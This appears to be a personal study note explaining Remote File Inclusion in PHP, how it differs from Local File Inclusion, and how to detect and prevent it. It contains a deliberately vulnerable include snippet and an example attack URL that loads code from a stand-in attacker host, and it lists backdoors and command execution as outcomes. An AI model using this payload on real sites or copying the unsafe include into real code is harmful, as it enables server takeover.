---
title: "RFI"
category: ["Networking & services configs", "Networking", "HACKING WIFI", "info de herramientas y conceptos", "RFI"]
---


Note title: RFI

A **RFI (Remote File Inclusion)** is a web vulnerability similar to LFI, but it allows an attacker to include remote files on the server through a manipulated input. It is more dangerous than LFI, as it facilitates the execution of arbitrary code hosted on another server controlled by the attacker.

### **How does an RFI work?**

1. **Vulnerable code:**
    
    php
    
    
    `<?php $file = $_GET['file']; include($file); ?>`
    
    In this example, the script allows a user to provide a file via the URL parameter `file`, which is directly included.

### **Key differences between LFI and RFI**

- **LFI (Local File Inclusion)**: Allows including files that are on the server's local system. An attacker can use this to read sensitive files like `/etc/passwd` or the application's configuration files.
- **RFI (Remote File Inclusion)**: Allows an attacker to include files hosted on a remote server. This can be especially dangerous because the attacker can execute malicious code from their own server.

### **How LFI and RFI are exploited**

- **LFI exploitation**: Involves searching for vulnerabilities that allow access to the server's local files. This can lead to exposure of sensitive data or command execution if combined with other vulnerabilities.
- **RFI exploitation**: A vulnerability is sought that allows the inclusion of external files. The attacker can use this to execute malicious scripts that give them control over the server.

### **Is LFI necessary to perform an RFI?**

No. If a web application is vulnerable to **RFI**, an attacker can directly include a remote file and execute code without needing to perform LFI first. However, in some cases, LFI can be a preliminary step to finding entry points that could lead to an **RFI**, especially if the goal is to find ways to execute malicious code from a server controlled by the attacker.

### **Attack sequence**

1. **LFI (if necessary)**: Access local files or expose system information.
2. **RFI**: Include and execute a remote file (such as a malicious PHP script) from an external server to take control of the compromised server.

### **How to protect against LFI and RFI?**

- **Validate inputs**: Do not allow the inclusion of file paths provided by the user without strict validation.
- **Disable remote file inclusion**: Configure the `php.ini` file to disable the `allow_url_include` option:
    
    
    `allow_url_include = Off`
    
- **Use absolute paths and avoid user input in `include` or `require` functions**.
- **Monitor and audit**: Use vulnerability scanning tools and conduct periodic audits to detect potential insecure entry points.
# **How to use RFI**

1. **When there is an entry point to load files remotely**:
    
    - The application must allow file inclusion using URL parameters, such as `include`, `require`, `file`, etc., and must be configured to accept remote URLs. This can be confirmed by checking the server configuration, specifically `allow_url_include` and `allow_url_fopen` in `php.ini`.
2. **Exploiting the vulnerability**:
    
    - If you find a vulnerable entry point, you can attempt to include malicious files from a server you control. This may involve using a URL pointing to a PHP script or another file with malicious code (e.g., `http://attacker.com/malicious_code.php`).
    - Example exploitation test:
        
        php
        
        
        `http://victim.com/index.php?page=http://attacker.com/malicious_code.php`
        
3. **Example of an RFI attack**:
    
    - If the application does not properly filter or validate file paths and allows including files from a URL, you can inject a remote file containing malicious PHP code. This code could perform actions such as:
        - **Executing remote commands**: Using functions like `shell_exec()`, `system()`, `exec()` to run commands on the server.
        - **Installing a backdoor**: Uploading a malicious file that allows remote control of the machine.
        - **Ransomware or sabotage**: Installing code that encrypts or deletes important files, such as databases or critical files.

### How to detect an RFI vulnerability?

1. **Reviewing URL parameters**:
    - Look for parameters that can be manipulated to load files, such as `include`, `file`, `page`, `module`, etc. Check if they are used in the URL in a way that can accept external paths.
2. **Testing external paths**:
    - Try changing parameter values to include remote URLs and observe how the application responds. If the application loads a file from an external URL, it is vulnerable.
3. **PHP configuration testing**:
    - Verify if `allow_url_include` and `allow_url_fopen` are enabled in the PHP configuration. If they are, an RFI attack is more likely to succeed.

### How to protect against RFI?

- **Disable `allow_url_include`**: This prevents the inclusion of remote files. The setting in `php.ini` should be:
    
    
    `allow_url_include = Off`
    
- **Filter user inputs**: Validate and sanitize any input used in file inclusion to prevent attackers from injecting malicious paths.
- **Use absolute paths**: Use absolute paths instead of dynamic paths based on user input.
- **Update and patch**: Keep the application and its components updated to protect against known vulnerabilities.

